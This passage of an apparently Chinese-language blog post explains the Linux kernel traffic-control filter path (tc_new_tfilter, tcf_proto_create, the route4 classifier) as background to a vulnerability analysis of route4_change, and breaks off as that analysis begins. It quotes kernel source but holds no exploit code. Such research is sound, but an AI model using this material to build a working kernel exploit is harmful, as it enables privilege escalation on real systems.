class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">tc_new_tfilter</span><span class="params">(struct sk_buff *skb, struct nlmsghdr *n,</span></span></span><br><span class="line"><span class="params"><span class="function">			  struct netlink_ext_ack *extack)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">net</span> *<span class="title">net</span> =</span> sock_net(skb-&gt;sk);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">tca</span>[<span class="title">TCA_MAX</span> + 1];</span></span><br><span class="line">	<span class="keyword">char</span> name[IFNAMSIZ];</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tcmsg</span> *<span class="title">t</span>;</span></span><br><span class="line">	u32 protocol;</span><br><span class="line">	u32 prio;</span><br><span class="line">	<span class="keyword">bool</span> prio_allocate;</span><br><span class="line">	u32 parent;</span><br><span class="line">	u32 chain_index;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">Qdisc</span> *<span class="title">q</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tcf_chain_info</span> <span class="title">chain_info</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tcf_chain</span> *<span class="title">chain</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tcf_block</span> *<span class="title">block</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tcf_proto</span> *<span class="title">tp</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> cl;</span><br><span class="line">	<span class="keyword">void</span> *fh;</span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line">	<span class="keyword">int</span> tp_created;</span><br><span class="line">	<span class="keyword">bool</span> rtnl_held = <span class="literal">false</span>;</span><br><span class="line">	u32 flags;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!netlink_ns_capable(skb, net-&gt;user_ns, CAP_NET_ADMIN))</span><br><span class="line">		<span class="keyword">return</span> -EPERM;</span><br><span class="line"></span><br><span class="line">replay:</span><br><span class="line">	tp_created = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	err = nlmsg_parse_deprecated(n, <span class="keyword">sizeof</span>(*t), tca, TCA_MAX,</span><br><span class="line">				     rtm_tca_policy, extack);</span><br><span class="line">	<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">	t = nlmsg_data(n);</span><br><span class="line">	protocol = TC_H_MIN(t-&gt;tcm_info);</span><br><span class="line">	prio = TC_H_MAJ(t-&gt;tcm_info);</span><br><span class="line">	prio_allocate = <span class="literal">false</span>;</span><br><span class="line">	parent = t-&gt;tcm_parent;</span><br><span class="line">	tp = <span class="literal">NULL</span>;</span><br><span class="line">	cl = <span class="number">0</span>;</span><br><span class="line">	block = <span class="literal">NULL</span>;</span><br><span class="line">	q = <span class="literal">NULL</span>;</span><br><span class="line">	chain = <span class="literal">NULL</span>;</span><br><span class="line">	flags = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (prio == <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="comment">/* If no priority is provided by the user,</span></span><br><span class="line"><span class="comment">		 * we allocate one.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> (n-&gt;nlmsg_flags &amp; NLM_F_CREATE) &#123;</span><br><span class="line">			prio = TC_H_MAKE(<span class="number">0x80000000</span>U, <span class="number">0U</span>);</span><br><span class="line">			prio_allocate = <span class="literal">true</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			NL_SET_ERR_MSG(extack, <span class="string">&quot;Invalid filter command with priority of zero&quot;</span>);</span><br><span class="line">			<span class="keyword">return</span> -ENOENT;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Find head of filter chain. */</span></span><br><span class="line"></span><br><span class="line">	err = __tcf_qdisc_find(net, &amp;q, &amp;parent, t-&gt;tcm_ifindex, <span class="literal">false</span>, extack);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		<span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (tcf_proto_check_kind(tca[TCA_KIND], name)) &#123;</span><br><span class="line">		NL_SET_ERR_MSG(extack, <span class="string">&quot;Specified TC filter name too long&quot;</span>);</span><br><span class="line">		err = -EINVAL;</span><br><span class="line">		<span class="keyword">goto</span> errout;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Take rtnl mutex if rtnl_held was set to true on previous iteration,</span></span><br><span class="line"><span class="comment">	 * block is shared (no qdisc found), qdisc is not unlocked, classifier</span></span><br><span class="line"><span class="comment">	 * type is not specified, classifier is not unlocked.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (rtnl_held ||</span><br><span class="line">	    (q &amp;&amp; !(q-&gt;ops-&gt;cl_ops-&gt;flags &amp; QDISC_CLASS_OPS_DOIT_UNLOCKED)) ||</span><br><span class="line">	    !tcf_proto_is_unlocked(name)) &#123;</span><br><span class="line">		rtnl_held = <span class="literal">true</span>;</span><br><span class="line">		rtnl_lock();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	err = __tcf_qdisc_cl_find(q, parent, &amp;cl, t-&gt;tcm_ifindex, extack);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		<span class="keyword">goto</span> errout;</span><br><span class="line"></span><br><span class="line">	block = __tcf_block_find(net, q, cl, t-&gt;tcm_ifindex, t-&gt;tcm_block_index,</span><br><span class="line">				 extack);</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(block)) &#123;</span><br><span class="line">		err = PTR_ERR(block);</span><br><span class="line">		<span class="keyword">goto</span> errout;</span><br><span class="line">	&#125;</span><br><span class="line">	block-&gt;classid = parent;</span><br><span class="line"></span><br><span class="line">	chain_index = tca[TCA_CHAIN] ? nla_get_u32(tca[TCA_CHAIN]) : <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (chain_index &gt; TC_ACT_EXT_VAL_MASK) &#123;</span><br><span class="line">		NL_SET_ERR_MSG(extack, <span class="string">&quot;Specified chain index exceeds upper limit&quot;</span>);</span><br><span class="line">		err = -EINVAL;</span><br><span class="line">		<span class="keyword">goto</span> errout;</span><br><span class="line">	&#125;</span><br><span class="line">	chain = tcf_chain_get(block, chain_index, <span class="literal">true</span>);</span><br><span class="line">	<span class="keyword">if</span> (!chain) &#123;</span><br><span class="line">		NL_SET_ERR_MSG(extack, <span class="string">&quot;Cannot create specified filter chain&quot;</span>);</span><br><span class="line">		err = -ENOMEM;</span><br><span class="line">		<span class="keyword">goto</span> errout;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	mutex_lock(&amp;chain-&gt;filter_chain_lock);</span><br><span class="line">	tp = tcf_chain_tp_find(chain, &amp;chain_info, protocol,</span><br><span class="line">			       prio, prio_allocate);</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(tp)) &#123;</span><br><span class="line">		NL_SET_ERR_MSG(extack, <span class="string">&quot;Filter with specified priority/protocol not found&quot;</span>);</span><br><span class="line">		err = PTR_ERR(tp);</span><br><span class="line">		<span class="keyword">goto</span> errout_locked;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (tp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">tcf_proto</span> *<span class="title">tp_new</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (chain-&gt;flushing) &#123;</span><br><span class="line">			err = -EAGAIN;</span><br><span class="line">			<span class="keyword">goto</span> errout_locked;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* Proto-tcf does not exist, create new one */</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (tca[TCA_KIND] == <span class="literal">NULL</span> || !protocol) &#123;</span><br><span class="line">			NL_SET_ERR_MSG(extack, <span class="string">&quot;Filter kind and protocol must be specified&quot;</span>);</span><br><span class="line">			err = -EINVAL;</span><br><span class="line">			<span class="keyword">goto</span> errout_locked;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!(n-&gt;nlmsg_flags &amp; NLM_F_CREATE)) &#123;</span><br><span class="line">			NL_SET_ERR_MSG(extack, <span class="string">&quot;Need both RTM_NEWTFILTER and NLM_F_CREATE to create a new filter&quot;</span>);</span><br><span class="line">			err = -ENOENT;</span><br><span class="line">			<span class="keyword">goto</span> errout_locked;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (prio_allocate)</span><br><span class="line">			prio = tcf_auto_prio(tcf_chain_tp_prev(chain,</span><br><span class="line">							       &amp;chain_info));</span><br><span class="line"></span><br><span class="line">		mutex_unlock(&amp;chain-&gt;filter_chain_lock);</span><br><span class="line">		tp_new = tcf_proto_create(name, protocol, prio, chain,</span><br><span class="line">					  rtnl_held, extack);</span><br><span class="line">		<span class="keyword">if</span> (IS_ERR(tp_new)) &#123;</span><br><span class="line">			err = PTR_ERR(tp_new);</span><br><span class="line">			<span class="keyword">goto</span> errout_tp;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		tp_created = <span class="number">1</span>;</span><br><span class="line">		tp = tcf_chain_tp_insert_unique(chain, tp_new, protocol, prio,</span><br><span class="line">						rtnl_held);</span><br><span class="line">		<span class="keyword">if</span> (IS_ERR(tp)) &#123;</span><br><span class="line">			err = PTR_ERR(tp);</span><br><span class="line">			<span class="keyword">goto</span> errout_tp;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		mutex_unlock(&amp;chain-&gt;filter_chain_lock);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (tca[TCA_KIND] &amp;&amp; nla_strcmp(tca[TCA_KIND], tp-&gt;ops-&gt;kind)) &#123;</span><br><span class="line">		NL_SET_ERR_MSG(extack, <span class="string">&quot;Specified filter kind does not match existing one&quot;</span>);</span><br><span class="line">		err = -EINVAL;</span><br><span class="line">		<span class="keyword">goto</span> errout;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	fh = tp-&gt;ops-&gt;get(tp, t-&gt;tcm_handle);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!fh) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!(n-&gt;nlmsg_flags &amp; NLM_F_CREATE)) &#123;</span><br><span class="line">			NL_SET_ERR_MSG(extack, <span class="string">&quot;Need both RTM_NEWTFILTER and NLM_F_CREATE to create a new filter&quot;</span>);</span><br><span class="line">			err = -ENOENT;</span><br><span class="line">			<span class="keyword">goto</span> errout;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (n-&gt;nlmsg_flags &amp; NLM_F_EXCL) &#123;</span><br><span class="line">		tfilter_put(tp, fh);</span><br><span class="line">		NL_SET_ERR_MSG(extack, <span class="string">&quot;Filter already exists&quot;</span>);</span><br><span class="line">		err = -EEXIST;</span><br><span class="line">		<span class="keyword">goto</span> errout;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (chain-&gt;tmplt_ops &amp;&amp; chain-&gt;tmplt_ops != tp-&gt;ops) &#123;</span><br><span class="line">		NL_SET_ERR_MSG(extack, <span class="string">&quot;Chain template is set to a different filter kind&quot;</span>);</span><br><span class="line">		err = -EINVAL;</span><br><span class="line">		<span class="keyword">goto</span> errout;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!(n-&gt;nlmsg_flags &amp; NLM_F_CREATE))</span><br><span class="line">		flags |= TCA_ACT_FLAGS_REPLACE;</span><br><span class="line">	<span class="keyword">if</span> (!rtnl_held)</span><br><span class="line">		flags |= TCA_ACT_FLAGS_NO_RTNL;</span><br><span class="line">	err = tp-&gt;ops-&gt;change(net, skb, tp, cl, t-&gt;tcm_handle, tca, &amp;fh,</span><br><span class="line">			      flags, extack);</span><br><span class="line">	<span class="keyword">if</span> (err == <span class="number">0</span>) &#123;</span><br><span class="line">		tfilter_notify(net, skb, n, tp, block, q, parent, fh,</span><br><span class="line">			       RTM_NEWTFILTER, <span class="literal">false</span>, rtnl_held);</span><br><span class="line">		tfilter_put(tp, fh);</span><br><span class="line">		<span class="comment">/* q pointer is NULL for shared blocks */</span></span><br><span class="line">		<span class="keyword">if</span> (q)</span><br><span class="line">			q-&gt;flags &amp;= ~TCQ_F_CAN_BYPASS;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">errout:</span><br><span class="line">	<span class="keyword">if</span> (err &amp;&amp; tp_created)</span><br><span class="line">		tcf_chain_tp_delete_empty(chain, tp, rtnl_held, <span class="literal">NULL</span>);</span><br><span class="line">errout_tp:</span><br><span class="line">	<span class="keyword">if</span> (chain) &#123;</span><br><span class="line">		<span class="keyword">if</span> (tp &amp;&amp; !IS_ERR(tp))</span><br><span class="line">			tcf_proto_put(tp, rtnl_held, <span class="literal">NULL</span>);</span><br><span class="line">		<span class="keyword">if</span> (!tp_created)</span><br><span class="line">			tcf_chain_put(chain);</span><br><span class="line">	&#125;</span><br><span class="line">	tcf_block_release(q, block, rtnl_held);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (rtnl_held)</span><br><span class="line">		rtnl_unlock();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (err == -EAGAIN) &#123;</span><br><span class="line">		<span class="comment">/* Take rtnl lock in case EAGAIN is caused by concurrent flush</span></span><br><span class="line"><span class="comment">		 * of target chain.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		rtnl_held = <span class="literal">true</span>;</span><br><span class="line">		<span class="comment">/* Replay the request. */</span></span><br><span class="line">		<span class="keyword">goto</span> replay;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">errout_locked:</span><br><span class="line">	mutex_unlock(&amp;chain-&gt;filter_chain_lock);</span><br><span class="line">	<span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里简单说一下上面函数的逻辑，首先通过<code>tcf_proto_check_kind(tca[TCA_KIND], name)</code>获取过滤器的名字，随后通过<code>tp = tcf_chain_tp_find(chain, &amp;chain_info, protocol, prio, prio_allocate)</code>获取指定协议的过滤器tp，如果tp为null则会创建新的tp，这里通过<code>tp_new = tcf_proto_create(name, protocol, prio, chain, rtnl_held, extack);</code>函数进行创建</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct tcf_proto *<span class="title">tcf_proto_create</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *kind, u32 protocol,</span></span></span><br><span class="line"><span class="params"><span class="function">					  u32 prio, struct tcf_chain *chain,</span></span></span><br><span class="line"><span class="params"><span class="function">					  <span class="keyword">bool</span> rtnl_held,</span></span></span><br><span class="line"><span class="params"><span class="function">					  struct netlink_ext_ack *extack)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tcf_proto</span> *<span class="title">tp</span>;</span></span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">	tp = kzalloc(<span class="keyword">sizeof</span>(*tp), GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!tp)</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(-ENOBUFS);</span><br><span class="line"></span><br><span class="line">	tp-&gt;ops = tcf_proto_lookup_ops(kind, rtnl_held, extack);</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(tp-&gt;ops)) &#123;</span><br><span class="line">		err = PTR_ERR(tp-&gt;ops);</span><br><span class="line">		<span class="keyword">goto</span> errout;</span><br><span class="line">	&#125;</span><br><span class="line">	tp-&gt;classify = tp-&gt;ops-&gt;classify;</span><br><span class="line">	tp-&gt;protocol = protocol;</span><br><span class="line">	tp-&gt;prio = prio;</span><br><span class="line">	tp-&gt;chain = chain;</span><br><span class="line">	spin_lock_init(&amp;tp-&gt;lock);</span><br><span class="line">	refcount_set(&amp;tp-&gt;refcnt, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	err = tp-&gt;ops-&gt;init(tp);</span><br><span class="line">	<span class="keyword">if</span> (err) &#123;</span><br><span class="line">		module_put(tp-&gt;ops-&gt;owner);</span><br><span class="line">		<span class="keyword">goto</span> errout;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> tp;</span><br><span class="line"></span><br><span class="line">errout:</span><br><span class="line">	kfree(tp);</span><br><span class="line">	<span class="keyword">return</span> ERR_PTR(err);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先是为tp分配了一个<code>object</code>随后通过<code>tcf_proto_lookup_ops</code>函数根据<code>kind</code>获取到对应的ops</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcf_proto_ops</span> *__<span class="title">tcf_proto_lookup_ops</span>(<span class="title">const</span> <span class="title">char</span> *<span class="title">kind</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcf_proto_ops</span> *<span class="title">t</span>, *<span class="title">res</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (kind) &#123;</span><br><span class="line">		read_lock(&amp;cls_mod_lock);</span><br><span class="line">		list_for_each_entry(t, &amp;tcf_proto_base, head) &#123;</span><br><span class="line">			<span class="keyword">if</span> (<span class="built_in">strcmp</span>(kind, t-&gt;kind) == <span class="number">0</span>) &#123;</span><br><span class="line">				<span class="keyword">if</span> (try_module_get(t-&gt;owner))</span><br><span class="line">					res = t;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		read_unlock(&amp;cls_mod_lock);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里以route为例子</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcf_proto_ops</span> <span class="title">cls_route4_ops</span> __<span class="title">read_mostly</span> =</span> &#123;</span><br><span class="line">	.kind		=	<span class="string">&quot;route&quot;</span>,</span><br><span class="line">	.classify	=	route4_classify,</span><br><span class="line">	.init		=	route4_init,</span><br><span class="line">	.destroy	=	route4_destroy,</span><br><span class="line">	.get		=	route4_get,</span><br><span class="line">	.change		=	route4_change,</span><br><span class="line">	.<span class="keyword">delete</span>		=	route4_delete,</span><br><span class="line">	.walk		=	route4_walk,</span><br><span class="line">	.dump		=	route4_dump,</span><br><span class="line">	.bind_class	=	route4_bind_class,</span><br><span class="line">	.owner		=	THIS_MODULE,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>上面的ops将会获得如上<code>cls_route4_ops</code>结构体随后会调用<code>tp-&gt;ops-&gt;init(tp)</code>进行初始化</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">route4_init</span><span class="params">(struct tcf_proto *tp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_head</span> *<span class="title">head</span>;</span></span><br><span class="line"></span><br><span class="line">	head = kzalloc(<span class="keyword">sizeof</span>(struct route4_head), GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (head == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> -ENOBUFS;</span><br><span class="line"></span><br><span class="line">	rcu_assign_pointer(tp-&gt;root, head);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到该函数会生成一个<code>route4_head</code>结构体，此结构体的作用是用于存放过滤器对应的哈希值。</p>
<p>接着回到<code>tc_new_tfilter</code>函数，其会将新生成的tp加入到chain中。接下来就会通过<code>fh = tp-&gt;ops-&gt;get(tp, t-&gt;tcm_handle)</code>语句调用对应的get函数，根据<code>tcm_handle</code>获取到过滤器</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">route4_get</span><span class="params">(struct tcf_proto *tp, u32 handle)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_head</span> *<span class="title">head</span> =</span> rtnl_dereference(tp-&gt;root);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_bucket</span> *<span class="title">b</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_filter</span> *<span class="title">f</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> h1, h2;</span><br><span class="line"></span><br><span class="line">	h1 = to_hash(handle);</span><br><span class="line">	<span class="keyword">if</span> (h1 &gt; <span class="number">256</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	h2 = from_hash(handle &gt;&gt; <span class="number">16</span>);</span><br><span class="line">	<span class="keyword">if</span> (h2 &gt; <span class="number">32</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	b = rtnl_dereference(head-&gt;table[h1]);</span><br><span class="line">	<span class="keyword">if</span> (b) &#123;</span><br><span class="line">		<span class="keyword">for</span> (f = rtnl_dereference(b-&gt;ht[h2]);</span><br><span class="line">		     f;</span><br><span class="line">		     f = rtnl_dereference(f-&gt;next))</span><br><span class="line">			<span class="keyword">if</span> (f-&gt;handle == handle)</span><br><span class="line">				<span class="keyword">return</span> f;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里会根据<code>handle</code>从<code>route4_head</code>链表中获取对应的<code>route4_filter</code>。如果返回为空，会接着进入到<code>tc_new_tfilter</code>函数的后续流程，最终在<code>tp-&gt;ops-&gt;change(net, skb, tp, cl, t-&gt;tcm_handle, tca, &amp;fh, flags, extack)</code>语句调用<code>change</code>函数创建一个新的过滤器。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞出现在<code>route4_change</code>函数中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span 